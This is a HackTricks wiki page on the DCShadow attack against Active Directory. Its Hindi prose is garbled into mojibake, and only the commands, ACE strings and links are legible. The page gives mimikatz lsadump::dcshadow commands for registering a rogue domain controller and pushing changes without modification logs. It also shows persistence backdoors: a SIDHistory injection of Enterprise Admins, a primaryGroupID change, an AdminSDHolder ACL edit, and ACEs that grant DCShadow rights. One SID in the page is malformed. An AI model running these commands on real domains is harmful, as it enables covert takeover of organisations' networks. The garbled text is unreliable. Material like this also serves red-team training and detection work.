<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>


# DCShadow

рдпрд╣ AD рдореЗрдВ **рдирдпрд╛ Domain Controller** рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдкрд░ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕ (SIDHistory, SPNs...) рдХреЛ **рдкреБрд╢** рдХрд░рддрд╛ рд╣реИ **рдмрд┐рдирд╛** рдХрд┐рд╕реА **рд▓реЙрдЧреНрд╕** рдХреЗ рдЬреЛ **рдореЙрдбрд┐рдлрд┐рдХреЗрд╢рдиреНрд╕** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрддрд╛рдПрдВред рдЖрдкрдХреЛ **DA** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ **рд░реВрдЯ рдбреЛрдореЗрди** рдХреЗ рдЕрдВрджрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдЧрд▓рдд рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХрд╛рдлреА рдмрджрд╕реВрд░рдд рд▓реЙрдЧреНрд╕ рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреЗред

рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ 2 mimikatz рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ RPC рд╕рд░реНрд╡рд░реНрд╕ рдХреЛ SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд░реЗрдЧрд╛ (рдЖрдкрдХреЛ рдпрд╣рд╛рдВ рдкрд░рд┐рд╡рд░реНрддрди рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рд╣реЛрдВрдЧреЗ рдЬреЛ рдЖрдк рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ), рдФрд░ рджреВрд╕рд░рд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдорд╛рдиреЛрдВ рдХреЛ рдкреБрд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - DA рдпрд╛ рдЗрд╕реА рддрд░рд╣ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`elevate::token`** mimikatz1 рд╕рддреНрд░ рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рдереНрд░реЗрдб рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝ рдЧрдП рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╣рдореЗрдВ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдмрдврд╝рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред\
рдЖрдк "LDAP" рдСрдмреНрдЬреЗрдХреНрдЯ рднреА рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдиреНрдпреВрдирддрдо рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ DA рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдкрд░рд┐рд╡рд░реНрддрди рдкреБрд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **рдбреЛрдореЗрди рдСрдмреНрдЬреЗрдХреНрдЯ** рдореЗрдВ:
* _DS-Install-Replica_ (рдбреЛрдореЗрди рдореЗрдВ рд░реЗрдкреНрд▓рд┐рдХрд╛ рдЬреЛрдбрд╝реЗрдВ/рд╣рдЯрд╛рдПрдВ)
* _DS-Replication-Manage-Topology_ (рд░реЗрдкреНрд▓рд┐рдХреЗрд╢рди рдЯреЛрдкреЛрд▓реЙрдЬреА рдкреНрд░рдмрдВрдзрди)
* _DS-Replication-Synchronize_ (рд░реЗрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рд┐рдВрдХреНрд░реЛрдирд╛рдЗрдЬрд╝реЗрд╢рди)
* **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрдВрдЯреЗрдирд░** рдореЗрдВ **рд╕рд╛рдЗрдЯреНрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ** (рдФрд░ рдЗрд╕рдХреЗ рдмрдЪреНрдЪреЗ):
* _CreateChild рдФрд░ DeleteChild_
* **рдХрдВрдкреНрдпреВрдЯрд░ рдХрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдЬреЛ DC рдХреЗ рд░реВрдк рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рд╣реИ**:
* _WriteProperty_ (Write рдирд╣реАрдВ)
* **рд▓рдХреНрд╖реНрдп рдСрдмреНрдЬреЗрдХреНрдЯ**:
* _WriteProperty_ (Write рдирд╣реАрдВ)

рдЖрдк [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрдирд╛рдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдпреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рд╕реЗ рдХреБрдЫ рд▓реЙрдЧ рдЫреЛрдбрд╝реЗ рдЬрд╛рдПрдВрдЧреЗ)ред рдпрд╣ DA рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рд╕реЗ рдХрд╣реАрдВ рдЕрдзрд┐рдХ рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо _**student1**_ рдЬрдм рдорд╢реАрди _**mcorp-student1**_ рдореЗрдВ рд▓реЙрдЧ рдЗрди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯ _**root1user**_ рдкрд░ DCShadow рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВред

## DCShadow рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреИрдХрдбреЛрд░ рдмрдирд╛рдирд╛

{% code title="рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ SIDHistory рдореЗрдВ Enterprise Admins рд╕реЗрдЯ рдХрд░рдирд╛" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="PrimaryGroupID рдмрджрд▓реЗрдВ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ Domain Administrators рдХрд╛ рд╕рджрд╕реНрдп рдмрдирд╛рдПрдВ)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolder рдХреЗ ntSecurityDescriptor рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ (рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рджреЗрдВ)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DCShadow рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдВ (рд╕рдВрд╢реЛрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓реЙрдЧ рдирд╣реАрдВ)

рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд ACEs рдХреЛ рд╣рдорд╛рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ SID рдХреЗ рд╕рд╛рде рдЕрдВрдд рдореЗрдВ рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛:

* рдбреЛрдореЗрди рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* рд╣рдорд▓рд╛рд╡рд░ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░: `(A;;WP;;;UserSID)`
* рд▓рдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░: `(A;;WP;;;UserSID)`
* рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╕рд╛рдЗрдЯреНрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░: `(A;CI;CCDC;;;UserSID)`

рдХрд┐рд╕реА рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╡рд░реНрддрдорд╛рди ACE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдПрдХ рдирд╣реАрдВ, **рдХрдИ рдкрд░рд┐рд╡рд░реНрддрди** рдХрд░рдиреЗ рд╣реЛрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП, **mimikatz1 рд╕рддреНрд░** (RPC рд╕рд░реНрд╡рд░) рдореЗрдВ рдЖрдк рдЬреЛ рднреА рдкрд░рд┐рд╡рд░реНрддрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЙрд╕рдХреЗ рд╕рд╛рде рдкреИрд░рд╛рдореАрдЯрд░ **`/stack` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред** рдЗрд╕ рддрд░рд╣, рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдПрдХ рдмрд╛рд░ **`/push`** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рддрд╛рдХрд┐ рд░реВрдЬ рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕рднреА рдЕрдЯрдХреЗ рд╣реБрдП рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред



[**DCShadow рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА ired.team рдкрд░ред**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
